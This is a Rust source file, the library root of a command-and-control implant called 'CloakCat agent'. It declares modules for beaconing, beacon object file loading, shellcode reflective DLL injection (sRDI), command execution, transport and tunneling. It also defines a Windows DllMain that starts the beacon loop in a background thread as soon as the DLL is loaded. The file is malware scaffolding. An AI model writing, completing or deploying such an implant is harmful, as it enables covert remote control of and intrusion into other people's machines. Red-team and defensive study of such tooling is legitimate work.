//! CloakCat agent library — shared by the binary and DLL targets.

mod beacon;
mod bof;
mod config;
mod exec;
mod host;
pub mod srdi;
mod tasks;
mod transport;
mod tunnel;

/// Async beacon main loop.  Called by `main()` and `DllMain`.
pub async fn beacon_main() -> anyhow::Result<()> {
    beacon::run().await
}

// ── Windows DLL entry point ────────────────────────────────────────────────

#[no_mangle]
#[cfg(target_os = "windows")]
pub extern "system" fn DllMain(
    _hinst: *mut u8,
    reason: u32,
    _reserved: *mut u8,
) -> i32 {
    if reason == 1 {
        // DLL_PROCESS_ATTACH — spawn a background thread so we don't block loader lock.
        std::thread::spawn(|| {
            let rt = tokio::runtime::Runtime::new().unwrap();
            rt.block_on(async {
                let _ = beacon_main().await;
            });
        });
    }
    1 // TRUE
}
